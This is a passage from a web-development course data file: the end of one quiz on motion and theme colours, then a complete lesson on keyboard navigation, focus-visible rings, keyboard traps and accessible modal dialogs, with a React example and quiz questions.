                'To satisfy legal requirements for font licensing'
              ],
              answerIndex: 1,
              explanation: 'prefers-reduced-motion respects user OS preferences, suppressing intense animations to protect motion-sensitive individuals.'
            },
            {
              question: 'Why does hardcoding "text-black" or "text-white" violate multi-theme design principles?',
              options: [
                'Because black and white are not real colors',
                'Because hardcoded text colors fail when themes invert (e.g. text-black becomes invisible on dark backgrounds)',
                'Because Tailwind CSS does not support black text',
                'Because screen readers crash when reading black text'
              ],
              answerIndex: 1,
              explanation: 'Hardcoded utility colors cannot adapt dynamically; in dark themes, hardcoded text-black results in unreadable black-on-black collisions.'
            }
          ]
        },
        {
          id: 'lesson-b4-3-3',
          title: 'Keyboard Traps & Screen Readers: Navigating Without a Mouse',
          subtitle: 'The Tab Key Test Every App Must Pass',
          firstPrinciplesIntuition: 'Put your mouse in your desk drawer right now. Open your web app and try to use it with only your keyboard: press Tab to jump between buttons, Space or Enter to activate them, and Escape to close modals. If you cannot see where your cursor is because someone wrote "outline: none", or if you get trapped inside a popup you cannot close, your app is broken.',
          content: `### In One Sentence
Accessible keyboard navigation ensures that all interactive elements are focusable, display high-visibility focus indicators, and can be operated without a mouse.

### Why It Matters
Millions of developers, power users, and individuals with motor disabilities navigate the web entirely using keyboards, switch devices, or screen readers. Removing focus rings without replacement (\`outline: none\`) is one of the most widespread antipatterns on the modern web, rendering an interface literally blind to keyboard users.

### Do It in the Workbench
1. Never remove focus outlines without providing a tactile visible ring:
   \`\`\`html
   <!-- WRONG: Invisible keyboard focus -->
   <button class="focus:outline-none">Click me</button>

   <!-- RIGHT: Clean on mouse click, distinct tactile ring on keyboard Tab -->
   <button class="focus:outline-none focus-visible:ring-2 focus-visible:ring-[var(--color-accent)]">
     Click me
   </button>
   \`\`\`
2. Notice the magic of \`:focus-visible\`: mouse clicks do NOT show an annoying ring, but pressing \`Tab\` displays a crisp, accessible highlight!
3. Ensure every modal has a keyboard Escape listener:
   \`if (e.key === 'Escape') onClose();\`

### What Can Go Wrong
The "Keyboard Trap": trapping user focus inside an element where pressing Tab or Shift+Tab cannot escape. Always test your complete flow using only the keyboard!`,
          initialCode: '// Accessible Modal Keyboard Navigation Pattern:\nimport { useEffect } from "react";\n\nexport function AccessibleModal({ isOpen, onClose }: { isOpen: boolean; onClose: () => void }) {\n  useEffect(() => {\n    if (!isOpen) return;\n    const handleKey = (e: KeyboardEvent) => {\n      if (e.key === "Escape") onClose();\n    };\n    window.addEventListener("keydown", handleKey);\n    return () => window.removeEventListener("keydown", handleKey);\n  }, [isOpen, onClose]);\n\n  if (!isOpen) return null;\n  return (\n    <div role="dialog" aria-modal="true" aria-label="Settings Dialog">\n      <button \n        onClick={onClose} \n        className="focus-visible:ring-2 focus-visible:ring-emerald-400 focus:outline-none"\n      >\n        Close (Esc)\n      </button>\n    </div>\n  );\n}',
          blueprint: '1. Goal: Implement WCAG 2.2 AA keyboard accessibility and focus management.\n2. Controls: focus-visible ring styles, Escape key dismissal listener, role="dialog" attributes.\n3. Rules: All interactive controls must be operable via Tab/Enter/Space/Escape with clear visual focus.',
          expectedOutput: 'Keyboard accessibility verified: 0 keyboard traps, visible focus rings.',
          audience: ['builder'],
          kind: 'concept',
          competencyIds: ['B4-COMP-3'],
          readingLevel: 6,
          lastVerified: '2026-10-08',
          reviewBy: '2026-11-08',
          quiz: [
            {
              question: 'Why is replacing "focus:outline-none" with "focus-visible:ring-2" considered best practice?',
              options: [
                'Because it keeps the button quiet for mouse clickers while providing a crisp, high-visibility focus ring when navigating via keyboard',
                'Because it saves 10 KB of bundle size',
                'Because focus-visible makes buttons rounded',
                'Because outline-none is blocked by Google Chrome'
              ],
              answerIndex: 0,
              explanation: ':focus-visible intelligently shows focus rings only when navigating via keyboard, eliminating visual clutter for mouse users while ensuring accessibility.'
            },
            {
              question: 'What is a "keyboard trap" in web accessibility?',
              options: [
                'A mechanical switch inside the keyboard that locks up',
                'A situation where a keyboard user navigates into a component (like a modal or widget) but cannot tab away or escape from it',
                'A keyboard shortcut that closes the browser window',
                'A virus that disables the spacebar'
              ],
              answerIndex: 1,
              explanation: 'A keyboard trap occurs when keyboard focus enters an element and cannot be navigated away from using standard keys like Tab or Escape.'
            },
            {
              question: 'What ARIA attributes should every modal dialog container include?',
              options: [
                'role="dialog" and aria-modal="true"',
                'role="button" and aria-hidden="true"',
                'role="textbox" and aria-disabled="true"',
                'role="image" and aria-busy="true"'
              ],
              answerIndex: 0,
              explanation: 'role="dialog" informs assistive technologies that the element is a modal dialog, and aria-modal="true" indicates background content is inert.'
            }
          ]
        }
      ]
    }
  ]
};
